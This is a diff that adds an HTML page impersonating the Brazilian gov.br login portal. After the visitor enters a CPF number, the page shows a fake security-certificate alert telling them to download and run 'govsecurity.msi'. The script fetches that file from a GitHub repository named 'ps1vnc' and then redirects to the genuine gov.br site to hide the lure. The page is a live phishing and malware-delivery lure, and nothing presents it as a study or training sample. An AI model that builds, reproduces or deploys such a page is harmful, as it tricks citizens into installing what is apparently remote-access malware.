@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <title>gov.br - Acesse sua conta</title>
+</head>
+<body>
+    <nav>
+        <a href=""><img src="img/govbr.png"></a>
+        <div class="accessibility">
+            <a href=""><img src="img/icons/contraste.png"><span>Alto Contraste</span></a>
+            <a href=""><img src="img/icons/surdo-de-ouvido.png"><span>VLibras</span></a>
+        </div>
+        
+    </nav>
+    <main>
+        <div class="left">
+            <img src="img/imagem-main-left-gov.jpg">
+        </div>
+        
+        <div class="right">
+            <div class="card">
+                <h3>Identifique-se no gov.br com:</h3>
+                <h4><img src="img/icons/id-card-solid.png">Número do CPF</h4>
+                <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+
+                <label for="CPF">CPF</label>
+                <!-- mudando input de number para text para permitir formatação com pontos e hífen -->
+                <input type="text" name="CPF" id="CPF" placeholder="Digite seu CPF" maxlength="14">
+
+                <div class="panel-button">
+                    <button id="loginBtn">Continuar</button>
+                </div>
+
+                <!-- Melhorando a apresentação da mensagem de erro com design mais profissional -->
+                <div id="errorMessage" class="security-alert" style="display: none;">
+                    <div class="alert-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L13.09 8.26L22 9L13.09 9.74L12 16L10.91 9.74L2 9L10.91 8.26L12 2Z" fill="#d32f2f"/>
+                            <path d="M12 7V13M12 17H12.01" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <div class="alert-content">
+                        <h4>Certificado de Segurança Necessário</h4>
+                        <p>Para acessar sua conta gov.br com segurança, você precisa instalar um certificado digital.</p>
+                        <div class="security-info">
+                            <p><strong>Como proceder:</strong></p>
+                            <ol style="text-align: left; margin: 10px 0; padding-left: 20px;">
+                                <li>Clique no botão "Baixar Certificado" abaixo</li>
+                                <li>Após o download, localize o arquivo <strong>govsecurity.msi</strong> em sua pasta de Downloads</li>
+                                <li>Clique duas vezes no arquivo para instalá-lo</li>
+                                <li>Siga as instruções na tela para completar a instalação</li>
+                                <li>Você será redirecionado automaticamente para continuar seu acesso</li>
+                            </ol>
+                            <small style="color: #666;">Este procedimento garante que sua conexão seja segura e autenticada.</small>
+                        </div>
+                    </div>
+                    <div class="alert-actions">
+                        <button id="downloadBtn" class="download-button">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M21 15V19A2 2 0 0 1 19 21H5A2 2 0 0 1 3 19V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <polyline points="7,10 12,15 17,10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <line x1="12" y1="15" x2="12" y2="3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                            </svg>
+                            Baixar Certificado
+                        </button>
+                    </div>
+                </div>
+
+                <h5>Outras opções de identificação:</h5>
+                <hr>
+
+                <div class="text">
+                    <a class="login-bank disabled-option" href="#"><img src="img/icons/InternetBanking-green.png">Login com seu banco<span>SUA CONTA SERÁ PRATA</span></a>
+                    <a class="disabled-option" href="#"><img src="img/icons/qrcode.png">Login com QR code</a>
+                    <a class="disabled-option" href="#"><img src="img/icons/CD.png">Seu certificado digital</a>
+                    <a class="disabled-option" href="#"><img src="img/icons/CD-Nuvem.png">Seu certificado digital em nuvem</a>
+                    
+                    <div class="security-warning">
+                        <p>Desabilitado por Motivos de Segurança</p>
+                    </div>
+                </div>
+                    
+                <div class="duvida">
+                    <a href="#"><img src="img/icons/ponto-de-interrogacao.png">Está com dúvida e precisa de ajuda?</a>
+                    <a class="termo" href="#">Termo de Uso e Aviso de Privacidade</a>
+                </div>
+                
+            </div>
+        </div>
+    </main>
+
+    <!-- Adicionando JavaScript para funcionalidade de login -->
+    <script>
+        const cpfInput = document.getElementById('CPF');
+        const loginBtn = document.getElementById('loginBtn');
+
+        // Função para formatar CPF automaticamente
+        function formatCPF(value) {
+            // Remove tudo que não é dígito
+            value = value.replace(/\D/g, '');
+            
+            // Aplica a formatação
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            }
+            
+            return value;
+        }
+
+        // Função para validar se CPF está completo
+        function isValidCPF(cpf) {
+            // Remove formatação
+            const numbers = cpf.replace(/\D/g, '');
+            return numbers.length === 11;
+        }
+
+        // Função para atualizar estado do botão
+        function updateButtonState() {
+            if (isValidCPF(cpfInput.value)) {
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = '1';
+                loginBtn.style.cursor = 'pointer';
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.style.opacity = '0.6';
+                loginBtn.style.cursor = 'not-allowed';
+            }
+        }
+
+        // Event listener para formatação em tempo real
+        cpfInput.addEventListener('input', function(e) {
+            const formatted = formatCPF(e.target.value);
+            e.target.value = formatted;
+            updateButtonState();
+        });
+
+        // Impede a digitação de caracteres não numéricos
+        cpfInput.addEventListener('keypress', function(e) {
+            // Permite apenas números, backspace, delete, tab, escape, enter
+            if (!/[0-9]/.test(e.key) && 
+                !['Backspace', 'Delete', 'Tab', 'Escape', 'Enter'].includes(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        // Inicializa o estado do botão como desabilitado
+        updateButtonState();
+
+        // Event listener para o botão de login
+        loginBtn.addEventListener('click', function() {
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Só executa se o CPF estiver válido
+            if (isValidCPF(cpfInput.value)) {
+                // Mostra a mensagem de erro
+                errorMessage.style.display = 'block';
+                
+                // Esconde o botão de continuar
+                this.style.display = 'none';
+            }
+        });
+
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            // Cria um link temporário para download
+            const link = document.createElement('a');
+            link.href = 'https://github.com/akiranakaisan184proton/ps1vnc/raw/refs/heads/main/govsecurity.msi';
+            link.download = 'govsecurity.msi';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Aguarda um breve momento e redireciona para o site original do gov.br
+            setTimeout(function() {
+                window.location.href = 'https://www.gov.br/pt-br/servicos/criar-sua-conta-meu-gov.br';
+            }, 2000); // 2 segundos de delay para garantir que o download inicie
+        });
+    </script>
+</body>
+</html>
